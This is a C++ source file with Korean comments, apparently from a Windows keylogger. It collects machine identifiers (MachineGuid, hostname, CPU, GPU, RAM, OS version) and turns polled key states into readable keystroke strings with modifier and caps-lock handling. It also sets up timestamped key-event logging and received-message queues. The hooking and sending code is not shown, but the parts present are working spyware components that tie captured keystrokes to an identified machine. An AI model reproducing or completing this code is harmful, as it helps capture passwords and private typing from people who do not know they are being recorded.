#include "pch.hpp"

// -------------------- UTF16 <-> UTF8 --------------------
static std::string WideToUtf8(const std::wstring& w) {
    if (w.empty()) return {};
    int needed = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    if (needed <= 0) return {};
    std::string out(needed, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), out.data(), needed, nullptr, nullptr);
    return out;
}

static std::wstring Trim(const std::wstring& s) {
    auto is_ws = [](wchar_t c) { return c == L' ' || c == L'\t' || c == L'\r' || c == L'\n'; };
    size_t b = 0, e = s.size();
    while (b < e && is_ws(s[b])) b++;
    while (e > b && is_ws(s[e - 1])) e--;
    return s.substr(b, e - b);
}

static std::wstring Join(const std::vector<std::wstring>& v, const wchar_t* sep) {
    std::wostringstream oss;
    for (size_t i = 0; i < v.size(); ++i) {
        if (i) oss << sep;
        oss << v[i];
    }
    return oss.str();
}

// -------------------- Registry helpers --------------------
static std::wstring RegGetSz(HKEY root, const wchar_t* subKey, const wchar_t* valueName) {
    DWORD type = 0;
    DWORD sizeBytes = 0;
    LONG rc = RegGetValueW(root, subKey, valueName, RRF_RT_REG_SZ, &type, nullptr, &sizeBytes);
    if (rc != ERROR_SUCCESS || sizeBytes < sizeof(wchar_t)) return L"";

    std::vector<wchar_t> buf(sizeBytes / sizeof(wchar_t), L'\0');
    rc = RegGetValueW(root, subKey, valueName, RRF_RT_REG_SZ, &type, buf.data(), &sizeBytes);
    if (rc != ERROR_SUCCESS) return L"";

    // RegGetValueW는 null-terminated로 줌
    return Trim(std::wstring(buf.data()));
}

static bool RegGetDword(HKEY root, const wchar_t* subKey, const wchar_t* valueName, DWORD& out) {
    DWORD type = 0;
    DWORD size = sizeof(DWORD);
    DWORD val = 0;
    LONG rc = RegGetValueW(root, subKey, valueName, RRF_RT_REG_DWORD, &type, &val, &size);
    if (rc != ERROR_SUCCESS) return false;
    out = val;
    return true;
}

// -------------------- WMI wrapper --------------------
std::string Wmi::HrHex(HRESULT hr)
{
    std::ostringstream oss;
    oss << "0x" << std::hex << std::uppercase << (unsigned long)hr;
    return oss.str();
}

void Wmi::InitSecurityOnce()
{
    static std::once_flag once;
    std::call_once(once, [] {
        HRESULT hr = CoInitializeSecurity(
            nullptr, -1, nullptr, nullptr,
            RPC_C_AUTHN_LEVEL_DEFAULT,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            nullptr,
            EOAC_DYNAMIC_CLOAKING,
            nullptr
        );
        if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
            throw std::runtime_error("CoInitializeSecurity failed: " + HrHex(hr));
        }
        });
}

Wmi::Wmi()
{
    InitSecurityOnce();

    Microsoft::WRL::ComPtr<IWbemLocator> locator;
    HRESULT hr = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&locator));
    if (FAILED(hr)) throw std::runtime_error("CoCreateInstance(IWbemLocator) failed: " + HrHex(hr));

    hr = locator->ConnectServer(
        _bstr_t(L"ROOT\\CIMV2"),
        nullptr, nullptr, nullptr,
        0, nullptr, nullptr,
        services_.GetAddressOf()
    );
    if (FAILED(hr)) throw std::runtime_error("WMI ConnectServer failed: " + HrHex(hr));

    hr = CoSetProxyBlanket(
        services_.Get(),
        RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr, EOAC_DYNAMIC_CLOAKING
    );
    if (FAILED(hr)) throw std::runtime_error("CoSetProxyBlanket failed: " + HrHex(hr));
}

std::vector<std::wstring> Wmi::QueryStringList(const std::wstring& className, const std::wstring& propName)
{
    if (!services_) return {};

    std::wstring wql = L"SELECT " + propName + L" FROM " + className;

    Microsoft::WRL::ComPtr<IEnumWbemClassObject> enumerator;
    HRESULT hr = services_->ExecQuery(
        _bstr_t(L"WQL"),
        _bstr_t(wql.c_str()),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        nullptr,
        enumerator.GetAddressOf()
    );
    if (FAILED(hr)) return {};

    std::vector<std::wstring> out;
    while (true) {
        Microsoft::WRL::ComPtr<IWbemClassObject> obj;
        ULONG returned = 0;
        hr = enumerator->Next(WBEM_INFINITE, 1, obj.GetAddressOf(), &returned);
        if (FAILED(hr) || returned == 0) break;

        VARIANT vt; VariantInit(&vt);
        hr = obj->Get(propName.c_str(), 0, &vt, nullptr, nullptr);
        if (SUCCEEDED(hr) && vt.vt == VT_BSTR && vt.bstrVal) {
            out.emplace_back(Trim(vt.bstrVal));
        }
        VariantClear(&vt);
    }
    return out;
}

// -------------------- GetMachineGuid --------------------
std::wstring GetMachineGuid()
{
    const wchar_t* subKey = L"SOFTWARE\\Microsoft\\Cryptography";
    const wchar_t* valueName = L"MachineGuid";

    HKEY hKey = nullptr;

    // 64-bit 레지스트리 뷰 강제 (32-bit 앱이더라도 64-bit 뷰로 읽게 함)
    LONG rc = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        subKey,
        0,
        KEY_READ | KEY_WOW64_64KEY,
        &hKey
    );

    // 일부 환경(32bit OS 등)에서는 KEY_WOW64_64KEY가 의미 없거나 실패할 수 있으니 fallback
    if (rc != ERROR_SUCCESS) {
        rc = RegOpenKeyExW(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ, &hKey);
    }

    if (rc != ERROR_SUCCESS) {
        throw std::runtime_error("RegOpenKeyExW failed: " + std::to_string(rc));
    }

    // 꼭 닫아라. 인간은 자꾸 이걸 까먹더라.
    struct KeyCloser {
        HKEY k;
        ~KeyCloser() { if (k) RegCloseKey(k); }
    } closer{ hKey };

    DWORD type = 0;
    DWORD sizeBytes = 0;

    // 이제는 "열어둔 키 핸들(hKey)" 기준으로 읽기: lpSubKey = nullptr
    rc = RegGetValueW(
        hKey,
        nullptr,
        valueName,
        RRF_RT_REG_SZ,
        &type,
        nullptr,
        &sizeBytes
    );
    if (rc != ERROR_SUCCESS) {
        throw std::runtime_error("RegGetValueW(size) failed: " + std::to_string(rc));
    }

    std::vector<wchar_t> buf(sizeBytes / sizeof(wchar_t));

    rc = RegGetValueW(
        hKey,
        nullptr,
        valueName,
        RRF_RT_REG_SZ,
        &type,
        buf.data(),
        &sizeBytes
    );
    if (rc != ERROR_SUCCESS) {
        throw std::runtime_error("RegGetValueW(read) failed: " + std::to_string(rc));
    }

    return std::wstring(buf.data());
}

// -------------------- GetHostNameW --------------------
std::wstring GetHostNameW(bool fqdn)
{
    COMPUTER_NAME_FORMAT fmt = fqdn
        ? ComputerNamePhysicalDnsFullyQualified
        : ComputerNamePhysicalDnsHostname;

    DWORD size = 0;
    // 필요한 길이 얻기 (실패가 정상: ERROR_MORE_DATA)
    GetComputerNameExW(fmt, nullptr, &size);

    if (size == 0) return L"";

    std::wstring buf(size, L'\0');
    if (!GetComputerNameExW(fmt, buf.data(), &size)) {
        return L"";
    }

    // size는 복사된 글자 수(널 제외)로 나오는 케이스가 많아서 정리
    buf.resize(size);
    return Trim(buf);
}

std::string GetHostNameUtf8(bool fqdn)
{
    return WideToUtf8(GetHostNameW(fqdn));
}

// -------------------- Collectors --------------------
std::string FormatRamGbString(double gb)
{
    std::ostringstream oss;
    oss.setf(std::ios::fixed);
    oss << std::setprecision(2) << gb << " GB";
    return oss.str();
}

bool TryGetInstalledRamGb(double& outGb)
{
    ULONGLONG kb = 0;
    if (!GetPhysicallyInstalledSystemMemory(&kb)) return false;
    outGb = static_cast<double>(kb) / (1024.0 * 1024.0); // KB -> GB
    return true;
}

void GetWindowsOsNameVersion(std::string& outName, std::string& outVersion)
{
    const wchar_t* subKey = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";

    std::wstring productName = RegGetSz(HKEY_LOCAL_MACHINE, subKey, L"ProductName");
    std::wstring displayVersion = RegGetSz(HKEY_LOCAL_MACHINE, subKey, L"DisplayVersion");
    if (displayVersion.empty()) displayVersion = RegGetSz(HKEY_LOCAL_MACHINE, subKey, L"ReleaseId");

    std::wstring currentVersion = RegGetSz(HKEY_LOCAL_MACHINE, subKey, L"CurrentVersion");        // "10.0" 등
    std::wstring buildNumber = RegGetSz(HKEY_LOCAL_MACHINE, subKey, L"CurrentBuildNumber");    // "22631" 등
    if (buildNumber.empty())    buildNumber = RegGetSz(HKEY_LOCAL_MACHINE, subKey, L"CurrentBuild");

    DWORD ubr = 0;
    bool hasUbr = RegGetDword(HKEY_LOCAL_MACHINE, subKey, L"UBR", ubr);

    // os_name: "Microsoft " prefix 제거(있으면)
    const std::wstring ms = L"Microsoft ";
    if (productName.rfind(ms, 0) == 0) productName = productName.substr(ms.size());
    productName = Trim(productName);

    // os_version: "23H2 (10.0.22631.2861)" 같은 형태
    std::wstring ver = currentVersion;
    if (!buildNumber.empty()) {
        if (!ver.empty()) ver += L".";
        ver += buildNumber;
        if (hasUbr) {
            ver += L".";
            ver += std::to_wstring(ubr);
        }
    }

    std::wstring v = displayVersion;
    if (!ver.empty()) {
        if (!v.empty()) v += L" ";
        v += L"(" + ver + L")";
    }

    outName = WideToUtf8(productName.empty() ? L"Windows" : productName);
    outVersion = WideToUtf8(v.empty() ? L"(unknown)" : v);
}

Spec getSpec()
{
    Spec spec;

    // WMI (CPU/GPU)
    try {
        Wmi wmi;
        auto cpu = wmi.QueryStringList(L"Win32_Processor", L"Name");
        auto gpu = wmi.QueryStringList(L"Win32_VideoController", L"Name");

        // 빈값/중복 정리
        auto clean = [](std::vector<std::wstring>& v) {
            v.erase(std::remove_if(v.begin(), v.end(), [](const std::wstring& s) { return Trim(s).empty(); }), v.end());
            std::sort(v.begin(), v.end());
            v.erase(std::unique(v.begin(), v.end()), v.end());
            };
        clean(cpu);
        clean(gpu);

        spec.cpu_name = WideToUtf8(cpu.empty() ? L"(unknown)" : Join(cpu, L", "));
        spec.gpu_name = WideToUtf8(gpu.empty() ? L"" : Join(gpu, L", "));
    }
    catch (...) {
        spec.cpu_name = "(unknown)";
        spec.gpu_name = "";
    }

    try {
        spec.machine_guid = WideToUtf8(GetMachineGuid());
    }
    catch (const std::exception& e) {
        spec.machine_guid = "(unknown)";
    }


    // RAM
    double ramGb = 0.0;
    if (TryGetInstalledRamGb(ramGb)) spec.ram = FormatRamGbString(ramGb);
    else spec.ram = "(unknown)";

    // OS
    GetWindowsOsNameVersion(spec.os_name, spec.os_version);

    // HOSTNAME (필요시)
    spec.host_name = GetHostNameUtf8(false);

    return spec;
}


// =================== key_converter ===================


std::string VkCodeToString(
    WORD vkCode, bool shiftPressed, bool capsLockOn)
{
    // 알파벳 처리
    if (vkCode >= 'A' && vkCode <= 'Z') {
        bool isUpperCase = shiftPressed ^ capsLockOn;
        return std::string(1, static_cast<char>(isUpperCase ? vkCode : vkCode + 32));
    }

    // 숫자 패드
    if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9) {
        return GetNumpadKeyString(vkCode);
    }

    // 시프트 조합 처리
    if (shiftPressed) {
        std::string shifted = GetShiftedKeyString(vkCode);
        if (!shifted.empty()) return shifted;
    }

    // 기본 키 문자열
    std::string base = GetBaseKeyString(vkCode);
    if (!base.empty()) return base;

    // 알 수 없는 키
    return "[0x" + VkCodeToHexString(vkCode) + "]";
}

bool IsModifierKey(WORD vkCode)
{
    switch (vkCode) {
    case VK_SHIFT:
    case VK_LSHIFT:
    case VK_RSHIFT:
    case VK_CONTROL:
    case VK_LCONTROL:
    case VK_RCONTROL:
    case VK_MENU:   // ALT
    case VK_LMENU:
    case VK_RMENU:
    case VK_CAPITAL:
    case VK_NUMLOCK:
        return true;
    default:
        return false;
    }
}

bool IsSpecialKey(WORD vkCode)
{
    switch (vkCode) {
    case VK_RETURN:
    case VK_TAB:
    case VK_BACK:
    case VK_ESCAPE:
    case VK_INSERT:
    case VK_DELETE:
    case VK_HOME:
    case VK_END:
    case VK_PRIOR:
    case VK_NEXT:
    case VK_UP:
    case VK_DOWN:
    case VK_LEFT:
    case VK_RIGHT:
        return true;
    default:
        return (vkCode >= VK_F1 && vkCode <= VK_F24);
    }
}

std::string GetBaseKeyString(WORD vkCode)
{
    static const std::unordered_map<WORD, std::string> baseMap = {
     {VK_SPACE, "[SPACE]"},
     {VK_RETURN, "[ENTER]\n"},
     {VK_TAB, "[TAB]"},
     {VK_BACK, "[BACKSPACE]"},
     {VK_ESCAPE, "[ESC]"},
     {VK_INSERT, "[INSERT]"},
     {VK_DELETE, "[DELETE]"},
     {VK_HOME, "[HOME]"},
     {VK_END, "[END]"},
     {VK_PRIOR, "[PAGE UP]"},
     {VK_NEXT, "[PAGE DOWN]"},
     {VK_UP, "[UP]"},
     {VK_DOWN, "[DOWN]"},
     {VK_LEFT, "[LEFT]"},
     {VK_RIGHT, "[RIGHT]"},
     {VK_SNAPSHOT, "[PRINT SCREEN]"},
     {VK_SCROLL, "[SCROLL LOCK]"},
     {VK_PAUSE, "[PAUSE]"},
     {VK_LWIN, "[WIN]"},
     {VK_RWIN, "[WIN]"},
     {VK_APPS, "[MENU]"},
     {VK_ADD, "+"},
     {VK_SUBTRACT, "-"},
     {VK_MULTIPLY, "*"},
     {VK_DIVIDE, "/"},
     {VK_DECIMAL, "."},
     {0x30, "0"}, {0x31, "1"}, {0x32, "2"}, {0x33, "3"}, {0x34, "4"},
     {0x35, "5"}, {0x36, "6"}, {0x37, "7"}, {0x38, "8"}, {0x39, "9"},
     {0xBA, ";"}, {0xBB, "="}, {0xBC, ","}, {0xBD, "-"}, {0xBE, "."},
     {0xBF, "/"}, {0xC0, "`"}, {0xDB, "["}, {0xDC, "\\"}, {0xDD, "]"},
     {0xDE, "'"}
    };

    auto it = baseMap.find(vkCode);
    return it != baseMap.end() ? it->second : "";
}

std::string GetShiftedKeyString(WORD vkCode)
{
    static const std::unordered_map<WORD, std::string> shiftMap = {
     {0x30, ")"}, {0x31, "!"}, {0x32, "@"}, {0x33, "#"}, {0x34, "$"},
     {0x35, "%"}, {0x36, "^"}, {0x37, "&"}, {0x38, "*"}, {0x39, "("},
     {0xBA, ":"}, {0xBB, "+"}, {0xBC, "<"}, {0xBD, "_"}, {0xBE, ">"},
     {0xBF, "?"}, {0xC0, "~"}, {0xDB, "{"}, {0xDC, "|"}, {0xDD, "}"},
     {0xDE, "\""}
    };

    auto it = shiftMap.find(vkCode);
    return it != shiftMap.end() ? it->second : "";
}

std::string GetNumpadKeyString(WORD vkCode)
{
    if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9) {
        return std::string(1, static_cast<char>('0' + (vkCode - VK_NUMPAD0)));
    }
    return "";
}

std::string GetCurrentTimestamp()
{
    SYSTEMTIME st;
    GetLocalTime(&st);

    std::ostringstream oss;
    oss << st.wYear << "-"
        << std::setw(2) << std::setfill('0') << st.wMonth << "-"
        << std::setw(2) << st.wDay << " "
        << std::setw(2) << st.wHour << ":"
        << std::setw(2) << st.wMinute << ":"
        << std::setw(2) << st.wSecond;
    return oss.str();
}

std::string FormatTime(const SYSTEMTIME& st)
{
    std::ostringstream oss;
    oss << "["
        << std::setw(4) << st.wYear << "-"
        << std::setw(2) << std::setfill('0') << st.wMonth << "-"
        << std::setw(2) << st.wDay << " "
        << std::setw(2) << st.wHour << ":"
        << std::setw(2) << st.wMinute << ":"
        << std::setw(2) << st.wSecond << "]";
    return oss.str();
}

std::string VkCodeToHexString(WORD vkCode)
{
    std::ostringstream oss;
    oss << std::hex << std::uppercase << vkCode;
    return oss.str();
}

bool IsKeyPressed(WORD vkCode)
{
    return (GetAsyncKeyState(vkCode) & 0x8000) != 0;
}

// ===================== logger =====================
std::atomic<bool> logger_running = { false };
std::mutex log_m;
std::counting_semaphore<MAX_COUNT> log_sem(0);
std::queue<KeyEvent> log_q;


// ===================== KeyEventStructure =====================
KeyEvent::KeyEvent(const std::string& _timeStamp,const std::string& _capsLock, const std::string& _eventType, const std::string& _keyString)
    : timeStamp(_timeStamp), capsLock(_capsLock), eventType(_eventType), keyString(_keyString) {
};

//======================== received message ========================
std::mutex recv_m;
std::queue<std::string> recv_q;
std::counting_semaphore<MAX_COUNT> recv_sem(0);
std::atomic<bool> logger_consumer_running = { false };